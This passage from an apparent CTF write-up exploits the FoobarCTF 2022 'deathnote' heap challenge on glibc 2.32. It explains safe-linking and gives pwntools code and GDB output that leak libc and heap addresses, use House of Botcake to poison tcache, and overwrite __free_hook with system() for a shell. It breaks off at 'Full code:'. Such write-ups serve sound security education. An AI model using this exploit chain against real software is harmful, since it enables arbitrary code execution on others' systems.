<div class="relative"><pre><code class="language-c code-highlight"><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">PROTECT_PTR</span><span class="token expression"><span class="token punctuation">(</span>pos<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span> </span><span class="token punctuation">\</span>
</span></span><span class="code-line"><span class="token macro property">  <span class="token expression"><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token function">__typeof</span> <span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> pos<span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span> ptr<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span></span></span>
</span><span class="code-line"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name function">REVEAL_PTR</span><span class="token expression"><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span>  <span class="token function">PROTECT_PTR</span> <span class="token punctuation">(</span><span class="token operator">&amp;</span>ptr<span class="token punctuation">,</span> ptr<span class="token punctuation">)</span></span></span>
</span></code></pre></div>
<p>For example with the image below, <code>P</code> is previous address of old freed chunk, <code>L</code> is current chunk being freed, the protected forward pointer can be calculate as:</p>
<p><img src="/static/images/foobar-ctf-2022/images/ex_protect_ptr.png" alt="ex_protect_ptr.png"/></p>
<p>We can also create a script to <code>malloc()</code> and then <code>free()</code> to make it go to tcache and we check that. The address for the first chunk is <code>0x55555555b2a0</code> (don’t include heap metadata):</p>
<p><img src="/static/images/foobar-ctf-2022/images/prev_chunk_ex.png" alt="prev_chunk_ex.png"/></p>
<p>So when it’s freed, the protected forward pointer for this chunk can be calculate as follows:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line"># (&lt;Current chunk address&gt; &gt;&gt; 12) ^ &lt;Previous chunk address&gt; = &lt;protected forward pointer&gt;
</span><span class="code-line">  (     0x55555555b2a0     &gt;&gt; 12) ^             0            = 0x55555555b
</span></code></pre></div>
<p>Because this is the first chunk being freed and go to tcache first so <code>&lt;Previous chunk address&gt;</code> will equal to 0. And we will have the address for the second chunk is <code>0x55555555c2e0</code> (don’t include heap metadata):</p>
<p><img src="/static/images/foobar-ctf-2022/images/current_chunk_ex.png" alt="current_chunk_ex.png"/></p>
<p>So the protected forward pointer will equal to:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line"># (&lt;Current chunk address&gt; &gt;&gt; 12) ^ &lt;Previous chunk address&gt; = &lt;protected forward pointer&gt;
</span><span class="code-line">  (     0x55555555c2e0     &gt;&gt; 12) ^      0x55555555b2a0      = 0x55500000e7fc
</span></code></pre></div>
<p>So to overwrite forward pointer, we need the address of previous chunk. That’s the point we need to notice here.</p>
<h3 id="reference-sources"><a href="#reference-sources" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Reference sources</h3>
<ul>
<li><a target="_blank" rel="noopener noreferrer" href="https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4">https://arttnba3.cn/2020/09/08/CTF-0X00-BUUOJ-PWN/#glibc2-32%E4%B8%8Btcache%E6%96%B0%E5%A2%9E%E7%9A%84%E4%BF%9D%E6%8A%A4</a></li>
<li><a target="_blank" rel="noopener noreferrer" href="http://blog.nsfocus.net/glibc-234/">http://blog.nsfocus.net/glibc-234/</a></li>
</ul>
<h3 id="summary"><a href="#summary" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Summary:</h3>
<ol>
<li>Leak main arena address</li>
<li>Leak heap address</li>
<li>Overwrite forward pointer</li>
<li>Overwrite <code>__free_hook</code> with system()</li>
</ol>
<h2 id="3-exploit"><a href="#3-exploit" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>3. Exploit</h2>
<p>Before we exploit, I wrote these function for a convenient exploitation:</p>
<details><summary>Code snippet</summary><p><div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>idx<span class="token punctuation">,</span> size<span class="token punctuation">,</span> data<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;1&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;no : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;size : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>size<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;Name : &#x27;</span><span class="token punctuation">,</span> data<span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">show</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;2&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;no : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span><span class="code-line">    <span class="token keyword">return</span> p<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">b&#x27;\n&#x27;</span><span class="token punctuation">,</span> drop<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span>
</span><span class="code-line">
</span><span class="code-line"><span class="token keyword">def</span> <span class="token function">free</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;&gt;&gt; &#x27;</span><span class="token punctuation">,</span> <span class="token string">b&#x27;3&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">    p<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">&#x27;no : &#x27;</span><span class="token punctuation">,</span> <span class="token builtin">str</span><span class="token punctuation">(</span>idx<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div></p></details>
<p>And now let’s start!</p>
<h3 id="stage-1-leak-main-arena-address"><a href="#stage-1-leak-main-arena-address" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 1: Leak main arena address</h3>
<p>First, we will create a large chunk and then free it to make it go to unsorted bin:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">add(0, 0x1000, &#x27;{}&#x27;.format(0).encode()*8)
</span><span class="code-line">add(1, 0x10, &#x27;{}&#x27;.format(1).encode()*8)
</span><span class="code-line">free(0)
</span></code></pre></div>
<p>Check in GDB and we can see that the main arena address contains null byte at LSB:</p>
<p><img src="/static/images/foobar-ctf-2022/images/unsortedbin_null_byte.png" alt="unsortedbin_null_byte.png"/></p>
<p>And we know that <code>puts()</code> will stop at null byte, so we cannot print that address out. We will try to put it into the large bin to see if it’s different:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x1100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>And check again, we see that there is no null byte in the address anymore:</p>
<p><img src="/static/images/foobar-ctf-2022/images/large_bin_not_null_byte.png" alt="large_bin_not_null_byte.png"/></p>
<p>And below the libc main arena address is the heap forward and backward pointer but we won’t use this chunk to leak that heap address. Just libc is enough.</p>
<p>So we just leak the libc address out with the bug <strong>Use After Free</strong>, then calculate the offset and take the leaked address subtract with offset, we will get the libc base address:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/10xg 0x1b882a0-0x10
</span><span class="code-line">0x1b88290:  0x0000000000000000  0x0000000000001011
</span><span class="code-line">0x1b882a0:  0x00007f4a4b3d9220  0x00007f4a4b3d9220
</span><span class="code-line">0x1b882b0:  0x0000000001b88290  0x0000000001b88290
</span><span class="code-line">0x1b882c0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1b882d0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">
</span><span class="code-line">gef➤  vmmap
</span><span class="code-line">[ Legend:  Code | Heap | Stack ]
</span><span class="code-line">Start              End                Offset             Perm Path
</span><span class="code-line">...
</span><span class="code-line">0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched
</span><span class="code-line">0x0000000001b88000 0x0000000001ba9000 0x0000000000000000 rw- [heap]
</span><span class="code-line">0x00007f4a4b212000 0x00007f4a4b214000 0x0000000000000000 rw-
</span><span class="code-line">0x00007f4a4b214000 0x00007f4a4b23a000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so
</span><span class="code-line">0x00007f4a4b23a000 0x00007f4a4b388000 0x0000000000026000 r-x /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so
</span><span class="code-line">...
</span><span class="code-line">
</span><span class="code-line">gef➤  p/x 0x00007f4a4b3d9220 - 0x00007f4a4b214000
</span><span class="code-line">$1 = 0x1c5220
</span></code></pre></div>
<p>So offset is <code>0x1c5220</code>. The following code will be use to take this leak and calculate libc base address:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">libc<span class="token punctuation">.</span>address <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b&#x27;\x00\x00&#x27;</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x1c5220</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;Libc base: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>address<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>That’s great! Let’s move on the next stage: Leak heap address!</p>
<h3 id="stage-2-leak-heap-address"><a href="#stage-2-leak-heap-address" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 2: Leak heap address</h3>
<p>To leak heap address, we just simply create 1 small chunk then free it. Remember what I have explained? The forward pointer has to XOR first, then it will be written to chunk. So just <code>free()</code> 1 small chunk and we can get the address of forward pointer, then recover the base address of heap:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">fw_pointer = u64(show(0).ljust(8, b&#x27;\x00&#x27;))
</span><span class="code-line">log.success(&quot;Leak fw pointer: &quot; + hex(fw_pointer))
</span></code></pre></div>
<p>And we can see that the forward pointer was leaked:</p>
<p><img src="/static/images/foobar-ctf-2022/images/fw_pointer_leaked.png" alt="fw_pointer_leaked.png"/></p>
<p>Check with GDB:</p>
<p><img src="/static/images/foobar-ctf-2022/images/check_fw_pointer.png" alt="check_fw_pointer.png"/></p>
<p>So as I mentioned above, with the first chunk is freed and goes to tcache, the forward pointer will be like this:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line"># (&lt;Current chunk address&gt; &gt;&gt; 12) ^ &lt;Previous chunk address&gt; = &lt;protected forward pointer&gt;
</span><span class="code-line">  (       0x1a1c2a0        &gt;&gt; 12) ^             0            = 0x1a1c
</span></code></pre></div>
<p>So to recover the heap base address, we just simply do the reverse order (don’t need to XOR) with the following payload:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">heap <span class="token operator">=</span> u64<span class="token punctuation">(</span>show<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">12</span>
</span><span class="code-line">log<span class="token punctuation">.</span>success<span class="token punctuation">(</span><span class="token string">&quot;Heap base: &quot;</span> <span class="token operator">+</span> <span class="token builtin">hex</span><span class="token punctuation">(</span>heap<span class="token punctuation">)</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>And we get the heap base address. Before we move on next stage, just <code>malloc()</code> again to reset the state of tcache bin to null:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>And now, let’s move on!</p>
<h3 id="stage-3-overwrite-forward-pointer"><a href="#stage-3-overwrite-forward-pointer" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 3: Overwrite forward pointer</h3>
<p>For this stage, we will use the technique called <a target="_blank" rel="noopener noreferrer" href="https://github.com/shellphish/how2heap/blob/master/glibc_2.32/house_of_botcake.c">House of Botcake</a>.</p>
<p>We will first <code>malloc</code> 7 chunks with the size larger than fastbin but still smaller than tcache and the ideal size if 0x100:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    add<span class="token punctuation">(</span>i<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Next, we will create 2 chunks with the same size as 0x100, the first one will be used for controlling (overwrite forward pointer) and the second one for attacking tcache:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">add<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>And 1 small chunk to avoid consolidation:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">add<span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">,</span> <span class="token number">0x10</span><span class="token punctuation">,</span> <span class="token string">&#x27;{}&#x27;</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span><span class="token number">9</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">8</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>Next, we will free all 7 chunks at the beginning of this stage to fill up the tcache:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
</span><span class="code-line">    free<span class="token punctuation">(</span>i<span class="token punctuation">)</span>
</span></code></pre></div>
<p>And with the next free() the chunk with the same size as 0x100, because tcache is full so it will not be added to tcache but will put it to fastbin (if within size range of fastbin) or unsorted bin (in this case is unsorted bin because 0x100 is larger than fastbin)</p>
<p><img src="/static/images/foobar-ctf-2022/images/unsorted_bin_after_7_free.png" alt="unsorted_bin_after_7_free.png"/></p>
<p>So as the technique describe, we still have 2 chunk (index 7 and 8) haven’t freed yet. We will free the chunk which is below the other first (this case is chunk index 8 because it was <code>malloc()</code> later), then we free the chunk above that freed chunk to make consolidation between 2 chunk:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>After that, we will malloc 1 chunk with the same size of 0x100 to take 1 address out from tcache, and we free that chunk index 8 to put it to tcache and we successfully conducted a double free:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">add<span class="token punctuation">(</span><span class="token number">20</span><span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">,</span> <span class="token string">b&#x27;testtest&#x27;</span><span class="token punctuation">)</span>
</span><span class="code-line">free<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>I malloc with index 20 to not remove the pointer of index 8. After this, let’s check GDB. We can see that tcache is full of 7 chunk:</p>
<p><img src="/static/images/foobar-ctf-2022/images/tcache.png" alt="tcache.png"/></p>
<p>And unsorted bin contain a freed chunk:</p>
<p><img src="/static/images/foobar-ctf-2022/images/unsorted_bin.png" alt="unsorted_bin.png"/></p>
<p>Check the unsorted bin and we can see this:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/50xg 0x1604a20
</span><span class="code-line">0x1604a20:  0x0000000000000000  0x0000000000000221
</span><span class="code-line">0x1604a30:  0x0000000001604c60  0x00007f2a65850c00    &lt;-- Unsorted bin
</span><span class="code-line">0x1604a40:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604a50:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604a60:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604a70:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604a80:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604a90:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604aa0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604ab0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604ac0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604ad0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604ae0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604af0:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b00:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b10:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b20:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b30:  0x0000000000000000  0x0000000000000111
</span><span class="code-line">0x1604b40:  0x0000000001605e14  0x0000000001604010    &lt;-- Tcache
</span><span class="code-line">0x1604b50:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b60:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b70:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b80:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604b90:  0x0000000000000000  0x0000000000000000
</span><span class="code-line">0x1604ba0:  0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>The unsorted bin size is 0x210 so that we can malloc a chunk larger than 0x100 to change the forward pointer in tcache chunk. But first, we need to take the offset between heap base address and that tcache chunk address <code>0x1604b40</code>:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  vmmap
</span><span class="code-line">[ Legend:  Code | Heap | Stack ]
</span><span class="code-line">Start              End                Offset             Perm Path
</span><span class="code-line">...
</span><span class="code-line">0x0000000000404000 0x0000000000405000 0x0000000000004000 rw- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/dnote_patched
</span><span class="code-line">0x0000000001604000 0x0000000001625000 0x0000000000000000 rw- [heap]
</span><span class="code-line">0x00007f2a6568a000 0x00007f2a6568c000 0x0000000000000000 rw-
</span><span class="code-line">0x00007f2a6568c000 0x00007f2a656b2000 0x0000000000000000 r-- /home/nguyenhuutri/CTF/FoobarCTF/deathnote/dist/libc-2.32.so
</span><span class="code-line">...
</span><span class="code-line">
</span><span class="code-line">gef➤  p/x  0x1604b40- 0x0000000001604000
</span><span class="code-line">$1 = 0xb40
</span></code></pre></div>
<p>So we know the offset. Remember the new mechanism for the forward pointer and we can fake the forward pointer to malloc <code>__free_hook</code> with the payload below:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line"><span class="token comment"># The chunk we overwrite forward pointer has address at &quot;heap + 0xb40&quot;</span>
</span><span class="code-line">fake_fw_pointer <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>heap <span class="token operator">+</span> <span class="token number">0xb40</span><span class="token punctuation">)</span> <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">&#x27;__free_hook&#x27;</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
</span></code></pre></div>
<p>So that we fake the previous chunk into <code>__free_hook</code> and write it with the chunk from unsorted bin. We will <code>malloc</code> a chunk with size of 0x130 for overwriting:</p>
<div class="relative"><pre><code class="language-py code-highlight"><span class="code-line">payload <span class="token operator">=</span> <span class="token string">b&#x27;\x00&#x27;</span><span class="token operator">*</span><span class="token number">0x100</span>                 <span class="token comment"># Padding to tcache</span>
</span><span class="code-line">payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0x111</span><span class="token punctuation">)</span>               <span class="token comment"># Prev_size and size of tcache</span>
</span><span class="code-line">payload <span class="token operator">+=</span> flat<span class="token punctuation">(</span>fake_fw_pointer<span class="token punctuation">)</span>        <span class="token comment"># Overwrite forward pointer</span>
</span><span class="code-line">add<span class="token punctuation">(</span><span class="token number">10</span><span class="token punctuation">,</span> <span class="token number">0x130</span><span class="token punctuation">,</span> payload<span class="token punctuation">)</span>
</span></code></pre></div>
<p>And let’s check if our forward pointer is correct or not (Address changed):</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/50xg 0x0000000000caca20
</span><span class="code-line">0xcaca20:   0x0000000000000000  0x0000000000000141
</span><span class="code-line">0xcaca30:   0x00007f43934d0e10  0x00007f43934d0e10    &lt;-- New chunk from unsorted bin
</span><span class="code-line">0xcaca40:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca50:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca60:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca70:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca80:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca90:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacaa0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacab0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacac0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacad0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacae0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacaf0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb00:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb10:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb20:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb30:   0x0000000000000000  0x0000000000000111
</span><span class="code-line">0xcacb40:   0x0000000000cac4bc  0x0000000000cac010    &lt;-- Tcache
</span><span class="code-line">0xcacb50:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb60:   0x0000000000000000  0x00000000000000e1
</span><span class="code-line">0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    &lt;-- Unsorted bin
</span><span class="code-line">0xcacb80:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb90:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacba0:   0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>It malloc successfully, let’s check if everything is on the right path or not:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">gef➤  x/50xg 0x0000000000caca20
</span><span class="code-line">0xcaca20:   0x0000000000000000  0x0000000000000141
</span><span class="code-line">0xcaca30:   0x0000000000000000  0x0000000000000000    &lt;-- New chunk from unsorted bin
</span><span class="code-line">0xcaca40:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca50:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca60:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca70:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca80:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcaca90:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacaa0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacab0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacac0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacad0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacae0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacaf0:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb00:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb10:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb20:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb30:   0x0000000000000000  0x0000000000000111
</span><span class="code-line">0xcacb40:   0x00007f43934d37cc  0x0000000000ca000a    &lt;-- Forward pointer changed
</span><span class="code-line">0xcacb50:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb60:   0x0000000000000000  0x00000000000000e1
</span><span class="code-line">0xcacb70:   0x00007f43934d0c00  0x00007f43934d0c00    &lt;-- Unsorted bin
</span><span class="code-line">0xcacb80:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacb90:   0x0000000000000000  0x0000000000000000
</span><span class="code-line">0xcacba0:   0x0000000000000000  0x0000000000000000
</span></code></pre></div>
<p>We can see that it’s the correct position for our fake forward pointer. Let’s see if it’s the address of <code>__free_hook</code> or not:</p>
<p><img src="/static/images/foobar-ctf-2022/images/check_free_hook_address.png" alt="check_free_hook_address.png"/></p>
<p><img src="/static/images/foobar-ctf-2022/images/free_hook_address.png" alt="free_hook_address.png"/></p>
<p>That’s correct. Let’s move on the final stage to get shell!</p>
<h3 id="stage-4-overwrite-__free_hook-with-system"><a href="#stage-4-overwrite-__free_hook-with-system" aria-hidden="true" tabindex="-1"><span class="icon icon-link"></span></a>Stage 4: Overwrite <code>__free_hook</code> with system()</h3>
<p>Now, we just need to malloc 2 chunk with the same size as 0x100 to get the address from tcache and with second malloc, we will overwrite the address of system to that. With the first chunk, we will put the string <code>/bin/sh</code> into it so we just reuse this chunk to execute system(&quot;/bin/sh&quot;):</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">add(11, 0x100, b&#x27;/bin/sh&#x27;)
</span><span class="code-line">add(12, 0x100, p64(libc.sym[&#x27;system&#x27;]))
</span></code></pre></div>
<p>And finally, we free() chunk index 11 and get shell:</p>
<div class="relative"><pre><code class="code-highlight"><span class="code-line">free(11)
</span></code></pre></div>
<p>Full code:</p>
